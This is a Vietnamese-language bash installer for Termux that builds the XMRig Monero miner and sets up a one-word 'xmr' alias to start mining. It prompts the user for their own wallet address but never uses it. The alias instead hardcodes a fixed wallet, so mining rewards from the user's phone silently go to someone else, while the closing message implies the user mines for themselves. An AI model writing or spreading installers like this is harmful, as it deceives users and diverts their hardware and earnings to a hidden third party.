#!/bin/bash
printf '\n\033[1;32m [NKTOL] | >>welcome<< | create by: Háu Trung Lực\033[0m\n\n'
home='/data/data/com.termux/files/'

printf '\n\033[1;32m Tiến Hành Cài Dữ Liệu Cần Thiết\033[0m\n\n'
termux-setup-storage
pkg update -y
pkg upgrade -y
pkg install git -y
pkg install build-essential -y
pkg install cmake -y
pkg install clang -y
pkg install wget -y
pkg install proot -y

printf '\n\033[1;32m Tải về và build XMRig\033[0m\n\n'
cd ~
if [ -d xmrig ]; then
    rm -rf xmrig
fi
git clone https://github.com/xmrig/xmrig.git
mkdir xmrig/build
cd xmrig/scripts
./build_deps.sh --build-only
cd ../build
cmake .. -DXMRIG_DEPS=scripts/deps
make -j$(nproc)

if [ -f xmrig ]; then
    printf '\n\033[1;32m XMRig đã build thành công!\033[0m\n\n'
else
    printf '\n\033[1;31m Lỗi khi build XMRig.\033[0m\n\n'
    exit 1
fi

# ======= CẤU HÌNH ALIAS =======
printf '\n\033[1;32m Cấu hình alias xmr để chạy nhanh\033[0m\n\n'

read -p "Nhập địa chỉ ví XMR của bạn: " WALLET

if [ -z "$WALLET" ]; then
    echo "Bạn chưa nhập ví! Thoát..."
    exit 1
fi

echo "alias xmr='~/xmrig/build/xmrig -o pool.hashvault.pro:443 -u 43TgANFiYdJj8544Fm9cjTM5N81FNkfhC21Zv8XL2esPhnEU3hySQaiDwHQKYntCkD8z68KStUGoUWdPde231kJyEWMQuoQ -p x --tls'" >> ~/.bashrc
source ~/.bashrc

printf '\n\033[1;32m Hoàn tất cài đặt!\033[0m\n\n'
printf '\n\033[1;32m Giờ bạn chỉ cần gõ lệnh: \033[1;33mxmr\033[0m để bắt đầu đào Monero.\n'
